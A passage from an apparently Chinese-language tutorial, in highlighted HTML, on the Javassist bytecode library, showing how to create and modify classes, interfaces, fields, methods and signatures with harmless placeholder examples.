punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>pool<span class="token punctuation">.</span><span class="token function">importPackage</span><span class="token punctuation">(</span><span class="token string">"java.util"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ClassLoader（可选）<br>获得ClassLoader<br>Loader loader = new Loader(pool);<br>添加转换器（可选）</p><pre class="language-java" data-language="java"><code class="language-java">loader<span class="token punctuation">.</span><span class="token function">addTranslator</span><span class="token punctuation">(</span>pool<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Translator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">ClassPool</span> pool<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">CannotCompileException</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Loader started"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token class-name">ClassPool</span> pool<span class="token punctuation">,</span> <span class="token class-name">String</span> classname<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">CannotCompileException</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"com.github.test.Test"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addInterface</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.Cloneable"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h3><p><strong>新增/替换Class</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"com.github.test.Test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"com.github.test.Test"</span><span class="token punctuation">,</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.Thread"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"/path/to/class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClassIfNew</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"/path/to/class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>修改已有Class</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.github.test.Test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// com.github.test.Test[]</span><span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">getOrNull</span><span class="token punctuation">(</span><span class="token string">"com.github.test.Test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//CtClass ctClass = pool.getCtClass("[Lcom.github.test.Test;");</span></code></pre><p>复制已有Class</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">getAndRename</span><span class="token punctuation">(</span><span class="token string">"com.github.test.Test"</span><span class="token punctuation">,</span> <span class="token string">"com.github.test.Test2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>生成（加载）/保存Class（将冻结CtClass）</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 会打印WARNING</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token class-name">Neighbor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Neighbor必须为与ctClass同包的其他类</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getProtectionDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> loader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.github.test.Test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> byteCode <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DataOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"/path/to/class/file"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">"/path/to/classes/dir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>解冻CtClass</p><pre class="language-java" data-language="java"><code class="language-java">ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>将CtClass移出ClassPool</p><pre class="language-java" data-language="java"><code class="language-java">ctClass<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改类名</p><pre class="language-java" data-language="java"><code class="language-java">ctClass<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"com.github.test.Test2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置父类</p><pre class="language-java" data-language="java"><code class="language-java">ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.Thread"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置/添加接口</p><pre class="language-java" data-language="java"><code class="language-java">ctClass<span class="token punctuation">.</span><span class="token function">setInterfaces</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.io.Serializable"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">addInterface</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.io.Serializable"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置修饰符</p><pre class="language-java" data-language="java"><code class="language-java">ctClass<span class="token punctuation">.</span><span class="token function">setModifiers</span><span class="token punctuation">(</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">PUBLIC</span> <span class="token operator">|</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">ABSTRACT</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改类签名</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// class Test extends Thread implements Cloneable</span><span class="token class-name">ClassSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassSignature</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// class Test</span><span class="token class-name">ClassSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassSignature</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TypeParameter</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">new</span> <span class="token class-name">TypeParameter</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// class Test&lt;T&gt;</span><span class="token class-name">ClassSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassSignature</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ClassType</span><span class="token punctuation">(</span><span class="token string">"java.util.ArrayList"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// class Test extends ArrayList</span><span class="token class-name">ClassSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassSignature</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ClassType</span><span class="token punctuation">(</span><span class="token string">"java.util.ArrayList"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TypeArgument</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">new</span> <span class="token class-name">TypeArgument</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassType</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// class Test extends ArrayList&lt;String&gt;</span><span class="token class-name">ClassSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassSignature</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TypeParameter</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">new</span> <span class="token class-name">TypeParameter</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ClassType</span><span class="token punctuation">(</span><span class="token string">"java.util.ArrayList"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TypeArgument</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">new</span> <span class="token class-name">TypeArgument</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TypeVariable</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// class Test&lt;T&gt; extends ArrayList&lt;T&gt;</span><span class="token class-name">ClassSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassSignature</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ClassType</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">new</span> <span class="token class-name">ClassType</span><span class="token punctuation">(</span><span class="token string">"java.io.Serializable"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// class Test implements Serializable</span>ctClass<span class="token punctuation">.</span><span class="token function">setGenericSignature</span><span class="token punctuation">(</span>signature<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>接口<br>新增/替换接口</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtClass</span> ctInterface <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeInterface</span><span class="token punctuation">(</span><span class="token string">"com.github.test.ITest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtClass</span> ctInterface <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeInterface</span><span class="token punctuation">(</span><span class="token string">"com.github.test.ITest"</span><span class="token punctuation">,</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.io.Serializable"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtClass</span> ctInterface <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"/path/to/class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtClass</span> ctInterface <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClassIfNew</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"/path/to/class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改已有接口</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtClass</span> ctInterface <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.github.test.ITest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="Field"><a href="#Field" class="headerlink" title="Field"></a>Field</h3><p>新增属性</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtField</span> ctField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtField</span><span class="token punctuation">(</span><span class="token class-name">CtClass</span><span class="token punctuation">.</span>intType<span class="token punctuation">,</span> <span class="token string">"age"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtField</span> ctField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtField</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.util.List"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"list"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">addField</span><span class="token punctuation">(</span>ctField<span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">addField</span><span class="token punctuation">(</span>ctField<span class="token punctuation">,</span> <span class="token string">"new java.util.ArrayList()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改已有属性</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtField</span> ctField <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改属性名</p><pre class="language-java" data-language="java"><code class="language-java">ctField<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改类型</p><pre class="language-java" data-language="java"><code class="language-java">ctField<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置泛型类型</p><pre class="language-java" data-language="java"><code class="language-java">ctField<span class="token punctuation">.</span><span class="token function">setGenericSignature</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TypeVariable</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// T name;</span></code></pre><p>设置修饰符</p><pre class="language-java" data-language="java"><code class="language-java">ctField<span class="token punctuation">.</span><span class="token function">setModifiers</span><span class="token punctuation">(</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">PUBLIC</span> <span class="token operator">|</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">STATIC</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h3><p>新增方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtMethod</span> ctMethod <span class="token operator">=</span> <span class="token class-name">CtNewMethod</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"public int getAge() { return this.age; }"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtMethod</span> ctMethod <span class="token operator">=</span> <span class="token class-name">CtNewMethod</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"public int getAge() { return $proceed($$); }"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">,</span> <span class="token string">"this"</span><span class="token punctuation">,</span> <span class="token string">"from"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtMethod</span> ctMethod <span class="token operator">=</span> <span class="token class-name">CtNewMethod</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token class-name">CtClass</span><span class="token punctuation">.</span>intType<span class="token punctuation">,</span> <span class="token string">"getAge"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"{ return this.age; }"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtMethod</span> ctMethod <span class="token operator">=</span> <span class="token class-name">CtNewMethod</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">PUBLIC</span><span class="token punctuation">,</span> <span class="token class-name">CtClass</span><span class="token punctuation">.</span>intType<span class="token punctuation">,</span> <span class="token string">"getAge"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"{ return this.age; }"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span>ctMethod<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改已有方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtMethod</span> ctMethod <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtMethod</span> ctMethod <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token class-name">CtClass</span><span class="token punctuation">.</span>intType <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//CtMethod ctMethod = pool.getMethod("com.github.test.Test", "test");</span></code></pre><p>复制已有方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtMethod</span> ctMethod2 <span class="token operator">=</span> <span class="token class-name">CtNewMethod</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>ctMethod<span class="token punctuation">,</span> <span class="token string">"test2"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span>ctMethod2<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改方法名</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置异常类型</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">setExceptionTypes</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.RuntimeException"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改方法签名</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// int test(int a) throws RuntimeException</span><span class="token class-name">MethodSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MethodSignature</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// void test(int a) throws RuntimeException</span><span class="token class-name">MethodSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MethodSignature</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TypeParameter</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">new</span> <span class="token class-name">TypeParameter</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &lt;T&gt; void test(int a) throws RuntimeException</span><span class="token class-name">MethodSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MethodSignature</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Type</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">new</span> <span class="token class-name">TypeVariable</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// void test(T a) throws RuntimeException</span><span class="token class-name">MethodSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MethodSignature</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">BaseType</span><span class="token punctuation">(</span><span class="token string">"long"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// long test(int a) throws RuntimeException</span><span class="token class-name">MethodSignature</span> signature <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MethodSignature</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ObjectType</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">new</span> <span class="token class-name">ClassType</span><span class="token punctuation">(</span><span class="token string">"java.lang.IOException"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// void test(int a) throws IOException, RuntimeException</span>ctMethod<span class="token punctuation">.</span><span class="token function">setGenericSignature</span><span class="token punctuation">(</span>signature<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置修饰符</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">setModifiers</span><span class="token punctuation">(</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">PUBLIC</span> <span class="token operator">|</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">STATIC</span> <span class="token operator">|</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">SYNCHRONIZED</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>增加参数</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">insertParameter</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctMethod<span class="token punctuation">.</span><span class="token function">addParameter</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置方法体</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"{ System.out.println(\"new body\"); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>复制方法体</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span>ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"from"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置方法体与委派方法</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"{ $proceed($$); }"</span><span class="token punctuation">,</span> <span class="token string">"this"</span><span class="token punctuation">,</span> <span class="token string">"from"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// { this.from(...); }</span></code></pre><p>包装方法体</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 